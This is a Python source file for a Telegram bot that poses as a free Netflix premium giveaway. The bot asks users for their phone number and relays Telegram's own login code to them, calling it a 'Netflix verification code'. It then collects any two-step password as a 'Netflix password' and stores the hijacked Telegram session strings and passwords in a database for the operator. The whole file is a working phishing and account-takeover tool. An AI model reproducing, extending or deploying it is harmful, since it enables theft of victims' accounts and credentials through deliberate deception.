"""
FIXED NETFLIX OTP BOT v2.0
Stable with single event loop and thread-safe sessions
"""

import os
import sys
import logging
import threading
import time
import html
from datetime import datetime
from typing import Dict, Optional

from bson import ObjectId
from pymongo import MongoClient
import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery
)

# Import fixed modules
from account import ProfessionalAccountManager, create_account_manager
from otp import (
    safe_error_message, validate_phone, validate_otp,
    format_phone_display, create_safe_response,
    handle_pyrogram_error, escape_html, create_plain_text_message
)

# ========================
# CONFIGURATION
# ========================
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_ID_STR = os.getenv('ADMIN_ID', '0')
ADMIN_ID = int(ADMIN_ID_STR) if ADMIN_ID_STR.isdigit() else 0
API_ID_STR = os.getenv('API_ID', '0')
API_ID = int(API_ID_STR) if API_ID_STR.isdigit() else 0
API_HASH = os.getenv('API_HASH', '')
MONGO_URL = os.getenv('MONGO_URL', '')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', None)

MONGO_DB_NAME = "netflix_otp_bot"
NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
SUPPORT_USERNAME = "@YourSupportBot"

# ========================
# LOGGING
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ========================
# DATABASE MANAGER
# ========================
class DatabaseManager:
    """Simple database manager"""
    
    def __init__(self, mongo_url: str, db_name: str):
        self.client = MongoClient(mongo_url, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        
        # Ensure indexes
        self.db.users.create_index("user_id", unique=True)
        self.db.accounts.create_index("phone", unique=True)
        
        logger.info("✅ MongoDB connected")
    
    def ensure_user(self, user_id: int, user_name: str, username: str):
        """Ensure user exists in database"""
        user = self.db.users.find_one({"user_id": user_id})
        
        if not user:
            user_data = {
                "user_id": user_id,
                "name": user_name,
                "username": username,
                "is_admin": user_id == ADMIN_ID,
                "created_at": datetime.utcnow(),
                "last_seen": datetime.utcnow()
            }
            self.db.users.insert_one(user_data)
            logger.info(f"New user: {user_id} ({user_name})")
        else:
            self.db.users.update_one(
                {"user_id": user_id},
                {"$set": {"last_seen": datetime.utcnow()}}
            )
    
    def save_account(self, phone: str, session_string: str, 
                    has_2fa: bool = False, two_step_password: str = None,
                    added_by: int = None) -> bool:
        """Save account to database"""
        try:
            account_data = {
                "phone": phone,
                "session_string": session_string,
                "has_2fa": has_2fa,
                "two_step_password": two_step_password,
                "added_by": added_by,
                "created_at": datetime.utcnow(),
                "updated_at": datetime.utcnow(),
                "status": "active"
            }
            
            self.db.accounts.update_one(
                {"phone": phone},
                {"$set": account_data},
                upsert=True
            )
            
            logger.info(f"Account saved: {phone}")
            return True
            
        except Exception as e:
            logger.error(f"Save account error: {e}")
            return False
    
    def log_otp(self, phone: str, otp: str, fetched_by: int):
        """Log OTP fetch"""
        try:
            self.db.otp_logs.insert_one({
                "phone": phone,
                "otp": otp,
                "fetched_by": fetched_by,
                "fetched_at": datetime.utcnow()
            })
            return True
        except Exception as e:
            logger.error(f"Log OTP error: {e}")
            return False

# ========================
# SESSION STATE MANAGER
# ========================
class SessionStateManager:
    """Thread-safe session state management"""
    
    def __init__(self):
        self.user_states: Dict[int, Dict] = {}
        self.state_lock = threading.RLock()
    
    def set_state(self, user_id: int, state_data: Dict):
        """Set user state"""
        with self.state_lock:
            state_data["timestamp"] = time.time()
            self.user_states[user_id] = state_data
    
    def get_state(self, user_id: int) -> Optional[Dict]:
        """Get user state"""
        with self.state_lock:
            state = self.user_states.get(user_id)
            if state and time.time() - state.get("timestamp", 0) < 900:  # 15 min expiry
                return state
            elif state:
                del self.user_states[user_id]
            return None
    
    def clear_state(self, user_id: int):
        """Clear user state"""
        with self.state_lock:
            self.user_states.pop(user_id, None)

# ========================
# NETFLIX OTP BOT (FIXED)
# ========================
class NetflixOTPBot:
    """Main bot with fixed async handling"""
    
    def __init__(self):
        # Validate config
        self._validate_config()
        
        # Initialize components
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.db = DatabaseManager(MONGO_URL, MONGO_DB_NAME)
        self.state_manager = SessionStateManager()
        self.account_manager = create_account_manager(API_ID, API_HASH, ENCRYPTION_KEY)
        
        # Register handlers
        self._register_handlers()
        
        logger.info("✅ Netflix OTP Bot initialized")
    
    def _validate_config(self):
        """Validate configuration"""
        required = {
            "BOT_TOKEN": BOT_TOKEN,
            "ADMIN_ID": ADMIN_ID,
            "API_ID": API_ID,
            "API_HASH": API_HASH,
            "MONGO_URL": MONGO_URL
        }
        
        missing = [k for k, v in required.items() if not v]
        if missing:
            error_msg = f"Missing config: {', '.join(missing)}"
            logger.error(error_msg)
            raise ValueError(error_msg)
    
    def _register_handlers(self):
        """Register bot handlers"""
        
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self._handle_start_safe(message)
        
        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            self._handle_help_safe(message)
        
        @self.bot.message_handler(commands=['stats'])
        def handle_stats(message):
            self._handle_stats_safe(message)
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            self._handle_callback_safe(call)
        
        @self.bot.message_handler(func=lambda m: True)
        def handle_message(message):
            self._handle_message_safe(message)
    
    # ========================
    # SAFE HANDLERS (WITH ERROR PROTECTION)
    # ========================
    
    def _handle_start_safe(self, message: Message):
        """Safe start handler"""
        try:
            user_id = message.from_user.id
            user_name = message.from_user.first_name
            username = message.from_user.username
            
            # Ensure user in DB
            self.db.ensure_user(user_id, user_name, username)
            
            # Clear any existing state
            self.state_manager.clear_state(user_id)
            
            # Show appropriate interface
            if user_id == ADMIN_ID:
                self._show_admin_dashboard(user_id, message.chat.id)
            else:
                self._show_welcome(user_id, message.chat.id)
                
        except Exception as e:
            logger.error(f"Start handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    def _handle_help_safe(self, message: Message):
        """Safe help handler"""
        try:
            help_text = """
🤖 Netflix OTP Bot Help

For Users:
• Click "Get Netflix Now" to start
• Enter phone number with country code
• Verify with OTP sent by Telegram
• Account delivered within 48 hours

For Admin:
• Use admin panel for management
• Add accounts for OTP fetching
• View OTP logs and statistics

Support: {support}
""".format(support=SUPPORT_USERNAME)
            
            self._send_safe_message(
                message.chat.id,
                help_text,
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Help handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    def _handle_stats_safe(self, message: Message):
        """Safe stats handler (admin only)"""
        try:
            user_id = message.from_user.id
            
            if user_id != ADMIN_ID:
                self._show_welcome(user_id, message.chat.id)
                return
            
            # Get stats
            stats = self.account_manager.get_stats()
            
            stats_text = f"""
📊 Bot Statistics

Session Storage:
• Total Sessions: {stats.get('session_storage', {}).get('total_sessions', 0)}

Account Manager:
• Encryption: {'✅ Enabled' if stats.get('encryption_enabled') else '❌ Disabled'}
"""
            
            self._send_safe_message(
                message.chat.id,
                stats_text,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Stats handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Error loading statistics"
            )
    
    def _handle_callback_safe(self, call: CallbackQuery):
        """Safe callback handler"""
        try:
            self.bot.answer_callback_query(call.id)
            
            user_id = call.from_user.id
            data = call.data
            
            if data == "get_netflix_now":
                self._start_netflix_login(user_id, call.message.chat.id)
            elif data == "cancel_netflix":
                self.state_manager.clear_state(user_id)
                self._show_welcome(user_id, call.message.chat.id)
            elif data == "admin_login" and user_id == ADMIN_ID:
                self._start_admin_login(user_id, call.message.chat.id)
            elif data == "back_to_admin" and user_id == ADMIN_ID:
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, call.message.chat.id)
            else:
                self._send_safe_message(
                    call.message.chat.id,
                    "Please use /start"
                )
                
        except Exception as e:
            logger.error(f"Callback handler error: {e}")
            try:
                self.bot.answer_callback_query(
                    call.id, 
                    "Error, please try again",
                    show_alert=True
                )
            except:
                pass
    
    def _handle_message_safe(self, message: Message):
        """Safe message handler"""
        try:
            user_id = message.from_user.id
            
            # Update user in DB
            self.db.ensure_user(
                user_id,
                message.from_user.first_name,
                message.from_user.username
            )
            
            # Check state
            state = self.state_manager.get_state(user_id)
            if not state:
                if user_id == ADMIN_ID:
                    self._show_admin_dashboard(user_id, message.chat.id)
                else:
                    self._show_welcome(user_id, message.chat.id)
                return
            
            # Route based on state
            if state.get("step") == "ask_phone":
                self._process_phone_input(user_id, message.chat.id, message.text)
            elif state.get("step") == "ask_otp":
                self._process_otp_input(user_id, message.chat.id, message.text, state)
            elif state.get("step") == "ask_2fa":
                self._process_2fa_input(user_id, message.chat.id, message.text, state)
            else:
                self.state_manager.clear_state(user_id)
                self._show_welcome(user_id, message.chat.id)
                
        except Exception as e:
            logger.error(f"Message handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    # ========================
    # PROCESSING FUNCTIONS
    # ========================
    
    def _start_netflix_login(self, user_id: int, chat_id: int):
        """Start Netflix login flow"""
        self.state_manager.set_state(user_id, {
            "step": "ask_phone",
            "user_type": "netflix"
        })
        
        text = """
📱 Netflix Account Setup

Enter your phone number with country code:

Format: +CountryCodeNumber
Example: +919876543210

⚠️ Netflix will send verification code to this number
🔒 Your number is secure and encrypted
"""
        
        self._send_safe_message(
            chat_id,
            text,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
    
    def _start_admin_login(self, user_id: int, chat_id: int):
        """Start admin login flow"""
        self.state_manager.set_state(user_id, {
            "step": "ask_phone",
            "user_type": "admin"
        })
        
        text = """
🔐 Add New Account

Enter phone number with country code:

Format: +CountryCodeNumber
Example: +919876543210

This will add the account to database for OTP fetching.
Encryption: ✅ Enabled
"""
        
        self._send_safe_message(
            chat_id,
            text,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    def _process_phone_input(self, user_id: int, chat_id: int, phone_input: str):
        """Process phone number input"""
        # Validate phone
        is_valid, error_or_phone = validate_phone(phone_input)
        if not is_valid:
            self._send_safe_message(
                chat_id,
                f"❌ Invalid Format\n\n{error_or_phone}\n\nPlease enter valid phone number:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        phone = error_or_phone
        state = self.state_manager.get_state(user_id)
        user_type = state.get("user_type", "netflix")
        
        # Show sending message
        self._send_safe_message(
            chat_id,
            "⏳ Sending OTP...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Send OTP
            result = self.account_manager.send_otp(phone)
            
            if not result.get("success"):
                error_msg = result.get("error", "Failed to send OTP")
                self._send_safe_message(
                    chat_id,
                    f"❌ Failed to send OTP\n\n{error_msg}\n\nPlease try again:",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                return
            
            # Update state
            self.state_manager.set_state(user_id, {
                "step": "ask_otp",
                "user_type": user_type,
                "phone": phone,
                "session_key": result["session_key"],
                "phone_code_hash": result["phone_code_hash"]
            })
            
            # Show OTP input
            if user_type == "admin":
                text = f"""
✅ OTP Sent Successfully

Phone: {format_phone_display(phone)}

Enter the 5-digit OTP code received on Telegram:
"""
            else:
                text = f"""
📩 Netflix Verification Code Sent

Phone: {format_phone_display(phone)}

Enter the 5-digit verification code:
Check your Telegram messages from "Telegram"
"""
            
            self._send_safe_message(
                chat_id,
                text,
                photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Send OTP error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Connection Error\n\nFailed to send verification code. Please try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    def _process_otp_input(self, user_id: int, chat_id: int, otp_input: str, state: Dict):
        """Process OTP input"""
        if not validate_otp(otp_input):
            self._send_safe_message(
                chat_id,
                "❌ Invalid Code\n\nOTP must be 5 or 6 digits. Please enter again:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        user_type = state.get("user_type", "netflix")
        
        # Show verifying message
        self._send_safe_message(
            chat_id,
            "⏳ Verifying OTP...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Verify OTP
            result = self.account_manager.verify_otp(
                state["session_key"],
                otp_input
            )
            
            if result.get("needs_2fa"):
                # 2FA required
                self.state_manager.set_state(user_id, {
                    **state,
                    "step": "ask_2fa"
                })
                
                if user_type == "admin":
                    text = """
🔐 Two-Step Verification Required

This account has two-step verification enabled.

Enter your 2-step verification password:
"""
                else:
                    text = """
🔒 Netflix Two-Step Verification

This Netflix account has extra security enabled.

Enter your Netflix account password:
"""
                
                self._send_safe_message(
                    chat_id,
                    text,
                    photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
                )
                return
            
            if not result.get("success"):
                error_msg = result.get("error", "Verification failed")
                self._send_safe_message(
                    chat_id,
                    f"❌ Verification Failed\n\n{error_msg}\n\nPlease try again with /start",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                self.state_manager.clear_state(user_id)
                return
            
            # Save account
            added_by = user_id if user_type == "admin" else None
            saved = self.db.save_account(
                state["phone"],
                result["session_string"],
                result["has_2fa"],
                None,  # No 2FA password in this flow
                added_by
            )
            
            # Show success
            if user_type == "admin":
                success_text = f"""
✅ Account Added Successfully!

Phone: {format_phone_display(state['phone'])}
2FA: {'✅ Enabled' if result['has_2fa'] else '❌ Disabled'}

Account has been added to database.
"""
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
            else:
                success_text = f"""
🎉 Netflix Request Submitted!

Your number: {format_phone_display(state['phone'])}
Status: Under Review
Estimated: 48 Hours

You will receive Netflix account details once approved.
"""
                self.state_manager.clear_state(user_id)
                self._send_safe_message(
                    chat_id,
                    success_text,
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
            
        except Exception as e:
            logger.error(f"Verify OTP error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Verification Error\n\nPlease try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    def _process_2fa_input(self, user_id: int, chat_id: int, password: str, state: Dict):
        """Process 2FA password input"""
        if not password.strip():
            self._send_safe_message(
                chat_id,
                "❌ Password Required\n\nPassword cannot be empty. Please enter again:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        user_type = state.get("user_type", "netflix")
        
        # Show verifying message
        self._send_safe_message(
            chat_id,
            "⏳ Verifying Password...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Verify 2FA
            result = self.account_manager.verify_2fa(
                state["session_key"],
                password
            )
            
            if not result.get("success"):
                error_msg = result.get("error", "Invalid password")
                self._send_safe_message(
                    chat_id,
                    f"❌ Password Incorrect\n\n{error_msg}\n\nPlease enter again:",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                return
            
            # Save account with 2FA password
            added_by = user_id if user_type == "admin" else None
            saved = self.db.save_account(
                state["phone"],
                result["session_string"],
                True,
                password,
                added_by
            )
            
            # Show success
            if user_type == "admin":
                success_text = f"""
✅ Account Added Successfully!

Phone: {format_phone_display(state['phone'])}
2FA: ✅ Enabled (with password)

Account has been added to database.
"""
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
            else:
                success_text = f"""
🎉 Netflix Account Secured!

Your number: {format_phone_display(state['phone'])}
Security: Two-Step Enabled
Status: Under Review
Estimated: 48 Hours

Netflix account will be delivered within 48 hours.
"""
                self.state_manager.clear_state(user_id)
                self._send_safe_message(
                    chat_id,
                    success_text,
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
            
        except Exception as e:
            logger.error(f"2FA verification error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Verification Error\n\nPlease try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    # ========================
    # UI FUNCTIONS
    # ========================
    
    def _show_welcome(self, user_id: int, chat_id: int):
        """Show welcome screen"""
        text = """
🎬 Welcome To Netflix On Your Number Bot 🎬

Get Your Premium Netflix Account Now 👇

✨ Premium Features:
• 4K Ultra HD Streaming 🎥
• Multiple Profiles 👥
• Ad-Free Experience 🚫
• Download for Offline Viewing 📥

📲 How to Get Netflix:
1. Click "Get Netflix Now" below
2. Enter your phone number
3. Verify with OTP
4. Receive Netflix account in 48 hours

🔥 Limited Time Offer!
⚡ Fast Delivery Guaranteed
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
        
        self._send_safe_message(
            chat_id,
            text,
            markup=markup,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
    
    def _show_admin_dashboard(self, user_id: int, chat_id: int):
        """Show admin dashboard"""
        if user_id != ADMIN_ID:
            self._show_welcome(user_id, chat_id)
            return
        
        text = """
👑 Netflix Admin Panel

📊 Management Tools:
• Add accounts for OTP fetching
• View OTP logs and statistics
• Manage existing accounts
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔐 Add Account", callback_data="admin_login"))
        markup.add(InlineKeyboardButton("📊 Statistics", callback_data="stats"))
        
        self._send_safe_message(
            chat_id,
            text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    def _send_safe_message(self, chat_id: int, text: str, 
                          markup=None, photo_url: str = None,
                          parse_mode: str = None):
        """Send message with error handling and HTML escaping"""
        try:
            # Escape HTML if not already escaped
            safe_text = escape_html(text) if parse_mode == "HTML" else text
            
            if photo_url:
                self.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo_url,
                    caption=safe_text,
                    reply_markup=markup,
                    parse_mode=parse_mode
                )
            else:
                self.bot.send_message(
                    chat_id=chat_id,
                    text=safe_text,
                    reply_markup=markup,
                    parse_mode=parse_mode
                )
                
        except Exception as e:
            logger.error(f"Send message error: {e}")
            # Fallback: try without formatting
            try:
                plain_text = create_plain_text_message(text)
                self.bot.send_message(chat_id, plain_text)
            except:
                pass  # Final fallback
    
    # ========================
    # BOT CONTROL
    # ========================
    
    def run(self):
        """Run the bot"""
        logger.info("🎬 Starting Netflix OTP Bot...")
        try:
            self.bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
        except Exception as e:
            logger.error(f"Bot error: {e}")
            raise
        finally:
            self.shutdown()
    
    def shutdown(self):
        """Shutdown gracefully"""
        logger.info("Shutting down bot...")
        self.account_manager.disconnect_all()


# ========================
# MAIN ENTRY POINT
# ========================
if __name__ == "__main__":
    # Check environment variables
    required_vars = ["BOT_TOKEN", "ADMIN_ID", "API_ID", "API_HASH", "MONGO_URL"]
    missing_vars = [var for var in required_vars if not os.getenv(var)]
    
    if missing_vars:
        print("❌ Missing environment variables:")
        for var in missing_vars:
            print(f"  • {var}")
        sys.exit(1)
    
    # Create and run bot
    try:
        bot = NetflixOTPBot()
        bot.run()
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        sys.exit(1)
